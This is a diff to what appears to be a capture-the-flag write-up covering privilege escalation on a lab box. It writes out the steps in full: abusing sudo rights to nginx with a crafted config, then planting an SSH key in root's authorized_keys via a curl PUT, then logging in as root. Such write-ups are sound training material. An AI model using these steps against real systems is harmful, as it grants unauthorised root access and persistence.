@@ -50,5 +50,14 @@ Nmap done: 1 IP address (1 host up) scanned in 9.47 seconds
 * I was able to see that the activemq user is able to run the nginx command with sudo privileges
 * I then researched nginx privilege escalation and found [this git repo](https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406)
 	* A big issue I had with this exploit was that both`nano` and `vi` started looking and acting jank when I tried to use this
-		* to resolve this, I made the conf file on my kali host and uplo
-* After looking for a little push, I saw that I could just make the exploit on my host kali box and through it up on the webserver I used to exploit user.
+		* to resolve this, I made the conf file on my kali host and uploaded it to the web server I was hosting to pull the `poc.xml` from
+* After creating the conf file and pulling it to the broker box, I loaded the conf file onto nginx with `sudo nginx -c /tmp/urmom.conf`
+* I then generated a pair of ssh keys for myself, and added my public key to the root user with: 
+```bash
+curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"
+```
+* Finally, I sshed into the box as root with:
+```bash
+ssh -i .ssh/id_rsa -o StrictHostKeyChecking=no root@<BOXIP>
+```
+* `-o StrictHostKeyChecking=no` is needed or else it complains about a missing host key
